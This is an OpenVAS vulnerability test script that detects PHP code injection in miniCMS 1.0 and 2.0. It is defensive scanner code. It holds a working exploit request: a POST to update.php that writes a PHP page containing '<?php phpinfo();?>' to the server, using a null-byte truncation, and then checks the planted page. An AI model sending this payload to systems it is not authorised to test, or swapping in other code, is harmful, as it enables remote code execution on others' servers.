###############################################################################
# OpenVAS Vulnerability Test
#
# miniCMS Multiple Remote PHP Code Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103399");
  script_version("2022-04-27T12:01:52+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("miniCMS Multiple Remote PHP Code Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51612");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-01-24 11:44:44 +0100 (Tue, 24 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"miniCMS is prone to multiple vulnerabilities that attackers can
  leverage to execute arbitrary PHP code because the application fails
  to adequately sanitize user-supplied input.");

  script_tag(name:"impact", value:"Successful attacks can compromise the affected application and
  possibly the underlying computer.");

  script_tag(name:"affected", value:"miniCMS 1.0 and 2.0 are vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/minicms", "/cms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  buf = http_get_cache( item:dir + "/index.php", port:port );

  if( buf =~ "This site is managed using.*MiniCMS" ) {

    useragent = http_get_user_agent();
    vtstrings = get_vt_strings();
    page = vtstrings["lowercase_rand"] + ".php";
    ex = "title=1&metadata=1&area=content&content=<?php phpinfo();?>&page=" + page + "%00";

    len = strlen( ex );
    host = http_host_name( port:port );

    req = string("POST ", dir, "/update.php HTTP/1.1\r\n",
     "Host: ", host, "\r\n",
     "User-Agent: ", useragent, "\r\n",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
     "Accept-Language: en-us,en;q=0.5\r\n",
     "Accept-Encoding: gzip, deflate\r\n",
     "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
     "Connection: keep-alive\r\n",
     "Referer: http://",host,dir,"/index.php?page=1\r\n",
     "Cookie: miniCMSdemo=32b5075aba3eb6c5d11129ec114346c2\r\n",
     "Content-Type: application/x-www-form-urlencoded\r\n",
     "Content-Length: ",len,"\r\n",
     "\r\n",
     ex);
    result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( page >< result ) {
      url = dir + "/content/" + page;
      if(http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
